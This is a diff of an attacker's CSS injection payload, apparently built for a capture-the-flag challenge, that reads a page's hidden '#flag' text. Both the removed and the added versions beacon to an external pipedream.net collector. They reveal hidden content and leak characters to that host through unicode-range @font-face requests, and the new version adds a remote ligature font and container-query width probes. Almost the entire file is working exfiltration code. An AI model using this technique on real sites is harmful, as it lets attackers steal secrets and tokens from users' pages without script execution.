@@ -1,58 +1,64 @@
 /* beacon */
-body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=BEACON'); }
+body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=BEACON_CQ2'); }
 
-/* Bypass */
+/* bypass */
 #page { content-visibility: hidden; animation: unveil 0.001s 0.3s forwards; }
 @keyframes unveil { to { content-visibility: visible; } }
 #flag { display: block !important; }
 
-/* CONTENT-ONLY probe: 13ch width forces prefix onto line 1 */
-/* ::first-line override removes probes from line 1 chars   */
-#flag {
-  font-family: p97, p98, p99, p100, p101, p102, p103, p104, p105, p106, p107, p108, p109, p110, p111, p112, p113, p114, p115, p116, p117, p118, p119, p120, p121, p122, p48, p49, p50, p51, p52, p53, p54, p55, p56, p57, p95, p123, p125, monospace;
-  width: 13ch;
-  white-space: pre-wrap;
-  word-break: break-all;
-  overflow: visible;
-}
-#flag::first-line { font-family: monospace !important; }
+/* cqprobe font with '{X' ligatures */
+@font-face { font-family: cqprobe; src: url('https://uh4ck3r.github.io/ctf/cq_probe_0.woff2'); }
 
-@font-face{font-family:p97;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=a');unicode-range:U+0061}
-@font-face{font-family:p98;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=b');unicode-range:U+0062}
-@font-face{font-family:p99;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=c');unicode-range:U+0063}
-@font-face{font-family:p100;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=d');unicode-range:U+0064}
-@font-face{font-family:p101;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=e');unicode-range:U+0065}
-@font-face{font-family:p102;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=f');unicode-range:U+0066}
-@font-face{font-family:p103;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=g');unicode-range:U+0067}
-@font-face{font-family:p104;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=h');unicode-range:U+0068}
-@font-face{font-family:p105;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=i');unicode-range:U+0069}
-@font-face{font-family:p106;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=j');unicode-range:U+006A}
-@font-face{font-family:p107;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=k');unicode-range:U+006B}
-@font-face{font-family:p108;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=l');unicode-range:U+006C}
-@font-face{font-family:p109;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=m');unicode-range:U+006D}
-@font-face{font-family:p110;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=n');unicode-range:U+006E}
-@font-face{font-family:p111;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=o');unicode-range:U+006F}
-@font-face{font-family:p112;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=p');unicode-range:U+0070}
-@font-face{font-family:p113;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=q');unicode-range:U+0071}
-@font-face{font-family:p114;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=r');unicode-range:U+0072}
-@font-face{font-family:p115;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=s');unicode-range:U+0073}
-@font-face{font-family:p116;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=t');unicode-range:U+0074}
-@font-face{font-family:p117;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=u');unicode-range:U+0075}
-@font-face{font-family:p118;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=v');unicode-range:U+0076}
-@font-face{font-family:p119;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=w');unicode-range:U+0077}
-@font-face{font-family:p120;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=x');unicode-range:U+0078}
-@font-face{font-family:p121;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=y');unicode-range:U+0079}
-@font-face{font-family:p122;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=z');unicode-range:U+007A}
-@font-face{font-family:p48;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=0');unicode-range:U+0030}
-@font-face{font-family:p49;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=1');unicode-range:U+0031}
-@font-face{font-family:p50;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=2');unicode-range:U+0032}
-@font-face{font-family:p51;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=3');unicode-range:U+0033}
-@font-face{font-family:p52;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=4');unicode-range:U+0034}
-@font-face{font-family:p53;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=5');unicode-range:U+0035}
-@font-face{font-family:p54;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=6');unicode-range:U+0036}
-@font-face{font-family:p55;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=7');unicode-range:U+0037}
-@font-face{font-family:p56;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=8');unicode-range:U+0038}
-@font-face{font-family:p57;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=9');unicode-range:U+0039}
-@font-face{font-family:p95;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=_');unicode-range:U+005F}
-@font-face{font-family:p123;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=%7B');unicode-range:U+007B}
-@font-face{font-family:p125;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=%7D');unicode-range:U+007D}
+/* Preload cqprobe before animation fires */
+body::before {
+  content: 'a';
+  font-family: cqprobe, monospace;
+  position: absolute; width: 0; height: 0; overflow: hidden;
+}
+
+/* PUA probe @font-face: fires URL when loaded for matching char */
+@font-face { font-family: puaE001; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=a'); unicode-range: U+E001 }
+@font-face { font-family: puaE002; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=b'); unicode-range: U+E002 }
+@font-face { font-family: puaE003; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=j'); unicode-range: U+E003 }
+@font-face { font-family: puaE004; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=p'); unicode-range: U+E004 }
+@font-face { font-family: puaE005; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=s'); unicode-range: U+E005 }
+@font-face { font-family: puaE006; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=y'); unicode-range: U+E006 }
+@font-face { font-family: puaE007; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=z'); unicode-range: U+E007 }
+@font-face { font-family: puaE008; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=0'); unicode-range: U+E008 }
+@font-face { font-family: puaE009; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=1'); unicode-range: U+E009 }
+@font-face { font-family: puaE00A; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=4'); unicode-range: U+E00A }
+@font-face { font-family: puaE00B; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=5'); unicode-range: U+E00B }
+@font-face { font-family: puaE00C; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=7'); unicode-range: U+E00C }
+@font-face { font-family: puaE00D; src: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c0=%7D'); unicode-range: U+E00D }
+
+/* Flag: ligature font + container */
+#flag {
+  font-family: cqprobe, monospace;
+  white-space: nowrap !important;
+  width: max-content !important;
+  overflow-wrap: normal !important;
+  word-break: normal !important;
+  container-type: inline-size;
+  container-name: flagcont;
+  font-feature-settings: 'liga' 1;
+}
+
+#flag::after {
+  content: '\E001\E002\E003\E004\E005\E006\E007\E008\E009\E00A\E00B\E00C\E00D';
+  font-family: monospace;
+}
+
+/* Container queries: match width range → enable PUA probe font */
+@container flagcont (min-width: 31px) and (max-width: 89px) { #flag::after { font-family: puaE001, monospace; } }
+@container flagcont (min-width: 91px) and (max-width: 149px) { #flag::after { font-family: puaE002, monospace; } }
+@container flagcont (min-width: 151px) and (max-width: 209px) { #flag::after { font-family: puaE003, monospace; } }
+@container flagcont (min-width: 211px) and (max-width: 269px) { #flag::after { font-family: puaE004, monospace; } }
+@container flagcont (min-width: 271px) and (max-width: 329px) { #flag::after { font-family: puaE005, monospace; } }
+@container flagcont (min-width: 331px) and (max-width: 389px) { #flag::after { font-family: puaE006, monospace; } }
+@container flagcont (min-width: 391px) and (max-width: 449px) { #flag::after { font-family: puaE007, monospace; } }
+@container flagcont (min-width: 451px) and (max-width: 509px) { #flag::after { font-family: puaE008, monospace; } }
+@container flagcont (min-width: 511px) and (max-width: 569px) { #flag::after { font-family: puaE009, monospace; } }
+@container flagcont (min-width: 571px) and (max-width: 629px) { #flag::after { font-family: puaE00A, monospace; } }
+@container flagcont (min-width: 631px) and (max-width: 689px) { #flag::after { font-family: puaE00B, monospace; } }
+@container flagcont (min-width: 691px) and (max-width: 749px) { #flag::after { font-family: puaE00C, monospace; } }
+@container flagcont (min-width: 751px) and (max-width: 809px) { #flag::after { font-family: puaE00D, monospace; } }
